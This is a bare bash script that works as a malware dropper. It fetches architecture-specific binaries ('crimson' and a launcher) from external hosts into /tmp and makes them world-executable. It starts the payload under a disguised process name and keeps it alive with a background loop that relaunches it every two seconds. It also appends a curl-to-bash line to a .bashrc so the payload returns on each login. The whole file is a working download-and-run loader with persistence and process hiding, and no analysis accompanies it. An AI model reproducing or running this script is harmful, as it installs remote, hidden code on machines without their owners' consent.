#!/bin/bash

if [ ! -f /tmp/crimson ]; then
    if [ "$(uname -m)" = 'x86_64' ]; then
        curl -s https://cybercrim.es/crimson.x86 -o /tmp/crimson
        curl -s https://x0.at/rOhT -o /tmp/local
    elif [ "$(uname -m)" = 'aarch64' ] || [ "$(uname -m)" = 'armv8l' ]; then
        curl -s https://cybercrim.es/crimson.arm -o /tmp/crimson
        curl -s https://x0.at/KTbz -o /tmp/local
    else
        exit 0
    fi
fi

if [ ! -f "$(pgrep -f "\?")" > /dev/null ]; then
    /tmp/local -s "" -d -p test.pid /tmp/crimson
fi   

chmod 777 /tmp/crimson
chmod 777 /tmp/local

(
    while true; do
        if [ ! "$(pgrep -f "\?")" > /dev/null ]; then
            /tmp/local -s "" -d -p test.pid /tmp/crimson
        fi
        sleep 2
    done    
) &>/dev/null &

if ! grep -q "cybercrim.es" "/tmp/.bashrc"; then echo "if ! pgrep -f '\?' > /dev/null; then (curl https://cybercrim.es/l | bash) &>/dev/null &; fi" >> "/tmp/.bashrc"; fi
